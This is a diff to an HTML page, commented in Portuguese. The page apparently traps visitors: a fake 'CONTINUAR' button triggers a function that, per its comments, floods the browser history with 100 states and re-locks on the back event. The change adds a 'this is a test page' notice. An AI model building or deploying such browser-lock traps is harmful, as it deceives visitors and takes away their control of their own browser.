@@ -77,6 +77,17 @@
         }
         
         /* Estado após o clique (volta a ficar totalmente branco) */
+        .test-notice {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #666;
+            font-size: 16px;
+            text-align: center;
+        }
+
+
         .hidden {
             display: none !important;
         }
@@ -92,10 +103,13 @@
         <div class="btn-fake">CONTINUAR</div>
     </div>
 
+    <div id="test-notice" class="test-notice hidden">Esta é uma página de teste.</div>
+
     <script>
         const lockURL = window.location.href;
         const layer = document.getElementById('interaction-layer');
         const container = document.getElementById('induction-container');
+        const testNotice = document.getElementById('test-notice');
 
         function activateUltraLock() {
             // 1. Inunda o histórico massivamente (100 estados)
@@ -105,6 +119,7 @@
             
             // 2. Esconde os elementos de indução para voltar ao fundo branco solicitado
             container.classList.add('hidden');
+            testNotice.classList.remove('hidden');
             document.body.style.backgroundColor = "#ffffff";
 
             // 3. Re-bloqueia no evento de popstate
